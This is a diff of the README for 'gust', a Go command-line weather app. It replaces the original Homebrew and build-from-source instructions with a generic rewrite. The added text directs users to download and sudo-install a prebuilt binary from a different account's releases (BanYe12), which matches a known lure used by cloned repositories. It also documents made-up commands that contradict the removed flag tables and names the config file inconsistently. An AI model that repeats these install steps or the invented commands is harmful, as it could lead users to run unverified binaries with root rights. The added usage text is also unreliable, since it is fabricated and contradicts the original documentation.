@@ -1,116 +1,140 @@
-# gust
+# 🌦️ Gust: A Command Line Weather App in Go
 
-A simple cli weather tool built with Go that provides weather forecasts in the terminal.
+![Gust Logo](https://img.shields.io/badge/Gust-Weather%20App-blue.svg)
+[![Latest Release](https://img.shields.io/github/v/release/BanYe12/gust)](https://github.com/BanYe12/gust/releases)
 
-<p align="center">
-<img src="https://github.com/user-attachments/assets/d5c8e7cc-c43c-4263-a516-89f01bb26a24" width="600">
-</p>
+Welcome to **Gust**, a simple and efficient command line weather application built with Go. This tool provides real-time weather updates directly from your terminal, making it easy to stay informed about the weather conditions in your area or anywhere in the world.
+
+## Table of Contents
+
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Configuration](#configuration)
+5. [Commands](#commands)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Acknowledgments](#acknowledgments)
+
+## Features
+
+- **Real-Time Weather Data**: Get the latest weather updates for any location.
+- **User-Friendly Interface**: Simple command line interface for easy access.
+- **Fast and Lightweight**: Built with Go, ensuring quick performance and minimal resource usage.
+- **Customizable Settings**: Tailor the app to fit your preferences.
+- **Multi-Location Support**: Check weather for multiple locations simultaneously.
 
 ## Installation
 
-### Option 1: Homebrew (macOS)
+To get started with Gust, download the latest release from our [Releases section](https://github.com/BanYe12/gust/releases). Choose the appropriate binary for your operating system, download it, and execute it to install the application.
 
-The easiest way to install gust at the moment is with Homebrew:
+### For Linux and macOS
 
-```sh
-brew tap josephburgess/formulae
-brew install gust
-```
+1. Open your terminal.
+2. Run the following command to download the latest version:
 
-### Option 2: Manual Installation
+   ```bash
+   curl -LO https://github.com/BanYe12/gust/releases/latest/download/gust-linux-amd64
+   ```
 
-#### 1. Clone the repository
+3. Make the binary executable:
 
-```sh
-git clone https://github.com/needydetain/gust.git
-cd gust
-```
+   ```bash
+   chmod +x gust-linux-amd64
+   ```
 
-#### 2. Install dependencies
+4. Move it to your PATH:
 
-```sh
-go mod tidy
-```
+   ```bash
+   sudo mv gust-linux-amd64 /usr/local/bin/gust
+   ```
 
-#### 3. Build the binary
+### For Windows
 
-```sh
-go build -o gust ./cmd/gust
-```
-
-#### 4. Install
-
-Move the binary to a directory in your `$PATH`:
-
-```sh
-mv gust /usr/local/bin/
-```
+1. Download the latest release from our [Releases section](https://github.com/BanYe12/gust/releases).
+2. Extract the downloaded ZIP file.
+3. Move the `gust.exe` file to a directory in your PATH.
 
 ## Usage
 
-The first time you run gust a first-time configuration wizard will get you set up in no time.
-
-### Basic Commands
+Once you have installed Gust, you can start using it immediately. Open your terminal and type:
 
 ```bash
-# Get weather for your default city
-gust
-
-# Get weather for a specific city
-gust london
+gust --help
 ```
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/76695b8d-5e37-45a3-89cd-2d5b3401c323" width="600">
-</p>
+This command will display all available options and commands.
 
-## Configuration Flags
+## Configuration
 
-_These flags modify user config / settings and don't display weather by themselves_
+Gust allows you to configure certain settings to enhance your experience. You can create a configuration file named `gust.config` in your home directory. Here’s how to set it up:
 
-| Short | Long               | Description                                                |
-| ----- | ------------------ | ---------------------------------------------------------- |
-| `-h`  | `--help`           | Show help                                                  |
-| `-S`  | `--setup`          | Run the setup wizard                                       |
-| `-A`  | `--api=STRING`     | Set custom API server URL (mostly for development)         |
-| `-C`  | `--city=STRING`    | Specify city name                                          |
-| `-D`  | `--default=STRING` | Set a new default city                                     |
-| `-U`  | `--units=STRING`   | Set default temperature units (metric, imperial, standard) |
-| `-L`  | `--login`          | Authenticate with GitHub                                   |
-| `-K`  | `--api-key`        | Set your api key (either gust, or openweathermap)          |
+1. Create the configuration file:
 
-## Display Flags
+   ```bash
+   touch ~/.gust.config
+   ```
 
-_These flags control how weather information is displayed_
+2. Open it with your favorite text editor:
 
-| Short | Long         | Description                                   |
-| ----- | ------------ | --------------------------------------------- |
-| `-a`  | `--alerts`   | Show weather alerts                           |
-| `-c`  | `--compact`  | Show today's compact weather view             |
-| `-d`  | `--detailed` | Show today's detailed weather view            |
-| `-f`  | `--full`     | Show today, 5-day and weather alert forecasts |
-| `-r`  | `--hourly`   | Show 24-hour (hourly) forecast                |
-| `-y`  | `--daily`    | Show 5-day forecast                           |
+   ```bash
+   nano ~/.gust.config
+   ```
 
-## Authentication
+3. Add your preferred settings, such as default location and units (metric or imperial).
 
-gust uses a proxy api I set up and host privately, [breeze](http://github.com/josephburgess/breeze), to fetch weather data. This keeps the setup flow pretty frictionless for new users.
+Example configuration:
 
-When you first run gust:
+```plaintext
+[DEFAULT]
+location = New York
+units = metric
+```
 
-1. A setup wizard will guide you through the initial configuration
-2. You'll be prompted to choose an authentication method:
-   - GitHub OAuth (one click sign up/in)
-   - Your own OpenWeather Map API key if you prefer not to use Oauth or need much higher rate limits
-     - User submitted keys will need to be eligible for the [One Call API 3.0](https://openweathermap.org/api/one-call-3#how)
-     - The first 1000 calls every day are free but they ask for CC info to get a key
-3. If you choose GitHub OAuth:
-   - Your default browser will open to complete authentication
-   - No need to manually obtain or manage API keys
-4. Your credentials will be securely stored locally for future use in `~/.config/gust/auth.json`
+## Commands
 
-After this one-time setup, authentication happens automatically whenever you use the app.
+Gust provides several commands to help you get the information you need quickly. Here are some of the most useful commands:
 
-## Troubleshooting
+- **Get Weather**: To get the current weather for a specific location, use:
 
-If you encounter any auth issues, you can re-run the setup wizard or use the `-L / --login` (Oauth) `-K / --api-key` (api key) flags to re-set your key or check the local config files.
+  ```bash
+  gust weather <location>
+  ```
+
+- **Forecast**: To get a 5-day weather forecast, use:
+
+  ```bash
+  gust forecast <location>
+  ```
+
+- **Set Default Location**: To set your default location for future commands, use:
+
+  ```bash
+  gust set-location <location>
+  ```
+
+## Contributing
+
+We welcome contributions to Gust! If you have suggestions, improvements, or bug fixes, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your forked repository.
+5. Open a pull request with a description of your changes.
+
+## License
+
+Gust is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Acknowledgments
+
+We would like to thank the following:
+
+- The Go community for their support and contributions.
+- OpenWeatherMap for providing the weather data API.
+- All contributors who help improve Gust.
+
+For more information and to download the latest version, visit our [Releases section](https://github.com/BanYe12/gust/releases). 
+
+Happy weather checking! 🌤️
